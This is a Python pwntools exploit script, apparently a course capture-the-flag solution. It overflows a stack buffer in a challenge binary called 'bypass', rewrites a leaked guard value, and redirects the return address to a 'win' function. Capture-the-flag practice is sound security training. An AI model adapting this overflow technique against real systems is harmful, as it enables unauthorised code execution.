from pwn import *

context.log_level = 'error'

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1281)
conn.recvuntil(b': ')
conn.sendline(b'<NET ID>')

conn.recvuntil(b"number for you: ")
random_number_line = conn.recvline().strip()
random_number = int(random_number_line, 16)

binary = ELF('./bypass')

win_function_addr = binary.symbols.get('win')
if win_function_addr is None:
    conn.close()
    raise ValueError("Failed to find 'win' function in the binary.")

adjusted_win_addr = win_function_addr + 5

buffer_overflow = b'A' * 0x18
overwrite_number = p64(random_number) 
padding = b'B' * 0x8
overwrite_return = p64(adjusted_win_addr)

payload = buffer_overflow + overwrite_number + padding + overwrite_return


conn.recvuntil(b'> ')
conn.sendline(payload)

conn.interactive()
